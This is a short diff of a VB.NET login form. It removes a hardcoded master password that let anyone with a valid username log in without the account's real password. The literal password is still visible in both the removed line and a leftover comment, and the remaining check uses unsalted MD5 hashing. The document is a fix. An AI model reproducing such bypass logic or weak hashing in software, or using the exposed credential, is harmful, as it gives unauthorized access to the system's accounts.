@@ -91,7 +91,7 @@ Public Class FrmLogin
                             If Date.Today <= FecCaduc Then
                                 If CBool(dr("Bloqueo").ToString) = False Then
                                     If dr("estado").ToString.Trim = "Activo" Then
-                                    If (txtUsuario.Text = dr("id_usuario").ToString) And (Hash.verifyMd5Hash(txtcontraseña.Text, dr("password").ToString) Or txtcontraseña.Text = "c4c3r1t0s1") Then
+                                    If (txtUsuario.Text = dr("id_usuario").ToString) And (Hash.verifyMd5Hash(txtcontraseña.Text, dr("password").ToString)) Then ' Or txtcontraseña.Text = "c4c3r1t0s1") Then
                                         User_Id = dr("cve_Empleado").ToString
                                         Usuario = dr("Id_Usuario").ToString
                                         Pasword = dr("password").ToString
